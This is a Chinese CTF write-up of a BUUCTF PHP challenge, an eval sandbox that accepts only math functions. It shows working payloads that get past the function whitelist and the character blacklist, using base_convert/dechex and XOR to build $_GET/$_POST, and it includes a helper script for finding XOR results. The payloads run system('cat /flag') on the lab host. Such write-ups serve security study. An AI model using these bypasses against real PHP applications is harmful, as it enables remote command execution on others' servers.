---
title: buuoj刷题记录7
date: 2020-01-10 22:19:24
tags:
 - buuctf
 - web
 - 命令执行
---

## 0x00 基础

`eval`可以执行PHP语句

`hex2bin`可以将十六进制的字符转成字符串，结果是字符串类型

`dechex`将十进制转换成十六进制，结果是字符串类型

PHP中数组除了可以使用[ ]  还可以使用{ }

PHP中调用shell命令使用`system()`

<!--more-->

PHP中关于进制转换函数,*dec 都是整型，其他都是字符串类型

https://blog.csdn.net/Auuuuuuuu/article/details/88778852

## 0x02 分析

源码分析

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
} 
```

会将输入的字符进行过滤，过滤了空格、换行符、制表符、单双引号、反引号、中括号，以及只能出现白名单中的单词。

最后有一个`eval`可以执行PHP语句，想办法构造$\_GET或者$\_POST

可以利用函数转变也可以使用异或

## 0x03 操作

payload1：`?sin=cat /flag&cos=system&c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{cos}($$pi{sin})`

![](/pic/23.png)

异或方法

开始用python写，字符串转十六进制，纠结了很久很久，只有int可以异或。还是选择PHP

```
<?php
$need=['_GET','_POST','_REQUEST'];
$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
foreach ($whitelist as $item )
{
    foreach ($need as $x)
    {

        if (in_array($x ^ $item^ $item ,$need))  //在PHP中异或
        {
            echo $x ^ $item;
            echo '|--- '.$x.' --- '.$item;
            echo '|<br/>';
        }
        
    }
}
?>
```

在结果中发现有一个纯数字的还有一个`9**0`,但是没想到怎么利用`9**0`

```
9**0|--- _GET --- fmod|
8"1&|--- _GET --- getrandmax|
85;!5|--- _POST --- getrandmax|
871#4+79|--- _REQUEST --- getrandmax|
7"=0|--- _GET --- hexdec|
75771|--- _POST --- hexdec|
7>5;|--- _GET --- hypot|
```

构造payload：`http://c5da3eac-8e0b-45e3-b441-971c92aa946c.node3.buuoj.cn/?c=$pi=decoct(31737)^hexdec;$$pi{abs}($$pi{cos})`

post 数据：`abs=system&cos=cat /flag`



![](/pic/24.png)

在PHP中无法直接数字与不加引号的字符异或，需要将数字转换成字符类型

![](/pic/25.png)

![](/pic/26.png)

![](/pic/27.png)

PHP异或操作，x位与x+n位异或结果是x位，后面n位直接丢弃。